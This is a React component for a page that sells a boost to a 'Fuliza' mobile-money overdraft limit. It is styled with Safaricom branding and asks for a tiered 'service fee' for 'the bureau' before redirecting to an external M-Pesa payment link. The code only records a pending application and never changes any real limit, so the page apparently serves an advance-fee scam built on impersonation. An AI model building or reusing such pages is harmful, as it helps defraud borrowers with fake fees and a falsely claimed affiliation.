
import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { collection, addDoc, doc, updateDoc } from 'firebase/firestore';
import { db } from '../firebase';
import { UserProfile, Application } from '../types';
import { LocalStore } from '../services/localStore';

const BoostPage: React.FC<{ profile: UserProfile | null }> = ({ profile }) => {
  const navigate = useNavigate();
  const [boostData, setBoostData] = useState<{ current: number, projected: number } | null>(null);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    const stored = sessionStorage.getItem('fuliza_boost_data');
    if (stored) {
      setBoostData(JSON.parse(stored));
    } else {
      // If no boost data, redirect to dashboard as fallback
      navigate('/dashboard');
    }
  }, [navigate]);

  const handleBoost = async () => {
    if (!profile || !boostData) return;
    setLoading(true);

    // Calculate fee based on upgrade amount
    // Logic: 10% of the increase difference (simplified) or tiered
    // Let's stick to the tiered logic but simplified
    let fee = 200;
    if (boostData.projected >= 10000) fee = 1000;
    else if (boostData.projected >= 5000) fee = 500;

    const applicationData: any = {
      userId: profile.uid,
      selectedPackage: `Boost to ${boostData.projected}`,
      requestedLimit: boostData.projected,
      serviceFee: fee,
      paymentStatus: 'pending',
      applicationStatus: 'pending',
      createdAt: Date.now()
    };

    try {
      await addDoc(collection(db, 'applications'), applicationData);
      
      const userUpdates = { 
        verificationStatus: 'payment_pending' as const,
        eligibleLimit: boostData.projected 
      };
      await updateDoc(doc(db, 'users', profile.uid), userUpdates);

    } catch (e) {
      console.warn("DB connection error. Saving locally.");
      LocalStore.saveApplication({ ...applicationData, id: `local_${Date.now()}` } as Application);
      LocalStore.updateProfile(profile.uid, { verificationStatus: 'payment_pending', eligibleLimit: boostData.projected });
    } finally {
       // Clear session storage to prevent re-looping
       sessionStorage.removeItem('fuliza_boost_data');
       // Redirect to Lipana
       window.location.href = "https://lipana.dev/pay/mpesa";
    }
  };

  if (!boostData) return null;

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center p-4 font-sans">
      <div className="w-full max-w-lg bg-white rounded-[40px] shadow-2xl border border-slate-100 overflow-hidden relative animate-fade-in-up">
        {/* Confetti / Celebration Bg */}
        <div className="absolute top-0 inset-x-0 h-40 bg-gradient-to-b from-green-50 to-white"></div>

        <div className="relative p-8 md:p-12 text-center">
          <div className="w-20 h-20 bg-green-100 text-safaricom-green rounded-full flex items-center justify-center text-3xl mx-auto mb-6 shadow-lg shadow-green-100">
            <i className="fa-solid fa-arrow-up-right-dots"></i>
          </div>

          <h1 className="text-3xl font-black text-slate-900 mb-2">Limit Upgrade Ready</h1>
          <p className="text-slate-500 text-sm font-medium mb-8">
            You are one step away from unlocking your new limit.
          </p>

          <div className="bg-slate-900 rounded-3xl p-8 mb-8 relative overflow-hidden group">
            <div className="absolute top-0 right-0 w-32 h-32 bg-safaricom-green/20 rounded-full blur-[40px] -mr-8 -mt-8"></div>
            
            <div className="flex items-center justify-between relative z-10">
              <div className="text-left">
                <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest mb-1">Current</p>
                <p className="text-xl font-black text-slate-500 line-through decoration-red-500/50">KES {boostData.current}</p>
              </div>
              <div className="w-8 h-8 rounded-full bg-white/10 flex items-center justify-center text-white">
                <i className="fa-solid fa-arrow-right"></i>
              </div>
              <div className="text-right">
                <p className="text-[10px] font-bold text-safaricom-green uppercase tracking-widest mb-1">New Limit</p>
                <p className="text-3xl font-black text-white">KES {boostData.projected}</p>
              </div>
            </div>
          </div>

          <div className="space-y-4">
             <div className="bg-orange-50 border border-orange-100 p-4 rounded-2xl flex gap-3 text-left">
               <i className="fa-solid fa-triangle-exclamation text-orange-500 mt-1"></i>
               <p className="text-xs text-orange-800 font-medium">
                 <strong>Action Required:</strong> A service fee is required to process this limit adjustment with the bureau.
               </p>
             </div>

             <button 
               onClick={handleBoost}
               disabled={loading}
               className="w-full bg-safaricom-green text-white py-5 rounded-2xl font-black uppercase tracking-widest shadow-xl shadow-green-600/30 hover:bg-[#3d8f39] hover:-translate-y-1 transition-all flex items-center justify-center gap-3"
             >
               {loading ? (
                 <>
                   <i className="fa-solid fa-circle-notch animate-spin"></i>
                   <span>Processing...</span>
                 </>
               ) : (
                 <>
                   <span>Pay Service Fee & Activate</span>
                   <i className="fa-solid fa-bolt"></i>
                 </>
               )}
             </button>
             
             <p className="text-[10px] text-slate-400 font-bold uppercase tracking-wide pt-2">
               <i className="fa-solid fa-lock mr-1"></i> Secure Payment by Lipana
             </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default BoostPage;
